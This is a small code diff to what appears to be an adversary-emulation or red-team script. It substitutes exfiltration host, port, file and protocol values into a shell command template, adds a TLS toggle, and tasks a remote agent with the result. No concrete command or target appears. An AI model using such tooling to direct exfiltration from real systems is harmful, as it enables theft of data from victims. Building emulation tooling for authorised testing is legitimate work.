@@ -202,7 +202,11 @@ for command in command_list.split(', '):
     # Replace variables in shell_command
     exfil_outfile_insert = re.sub('\$EXFIL_OUTFILE', exfil_outfile, command)
     exfil_type_insert = re.sub('\$EXFIL_TYPE', exfil_type, exfil_outfile_insert)
-    exfil_host_insert = re.sub('\$EXFIL_HOST', exfil_host, exfil_type_insert)
+    if exfil_tls.lower() == 'true':
+        exfil_tls_insert = re.sub('\$TLS', 'S', exfil_type_insert)
+    else:
+        exfil_tls_insert = re.sub('\$TLS', '', exfil_type_insert)
+    exfil_host_insert = re.sub('\$EXFIL_HOST', exfil_host, exfil_tls_insert)
     shell_command = re.sub('\$EXFIL_PORT', exfil_port, exfil_host_insert)
     print(f'\nTasking agent with agent_shell_command "{shell_command}"\n')
     try:
